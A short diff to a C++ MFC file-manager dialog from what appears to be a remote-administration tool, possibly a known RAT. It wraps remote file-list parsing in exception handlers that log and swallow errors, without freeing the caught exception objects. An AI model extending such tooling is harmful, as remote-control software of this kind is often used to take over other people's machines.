@@ -921,11 +921,29 @@ void CFileManagerDlg::OnReceiveComplete()
 	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
 	{
 	case TOKEN_FILE_LIST: // 文件列表
-		FixedRemoteFileList
+		try
+		{
+			FixedRemoteFileList
 			(
-			m_pContext->m_DeCompressionBuffer.GetBuffer(0),
-			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
+				m_pContext->m_DeCompressionBuffer.GetBuffer(0),
+				m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
 			);
+		}
+		catch (CMemoryException* e)
+		{
+			OutputDebugStringA("[ERROR] CMemoryException\n");
+		}
+		catch (CFileException* e)
+		{
+			OutputDebugStringA("[ERROR] CFileException\n");
+		}
+		catch (CException* e)
+		{
+			OutputDebugStringA("[ERROR] CException\n");
+		}
+		catch (...) {
+			OutputDebugStringA("[ERROR] Other exception\n");
+		}
 		break;
 	case TOKEN_FILE_SIZE: // 传输文件时的第一个数据包，文件大小，及文件名
 		CreateLocalRecvFile();
@@ -2091,7 +2109,6 @@ void CFileManagerDlg::SendFileData()
 	bool	bRet = true;
 	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
 	CloseHandle(hFile);
-
 
 	if (nNumberOfBytesRead > 0)
 	{
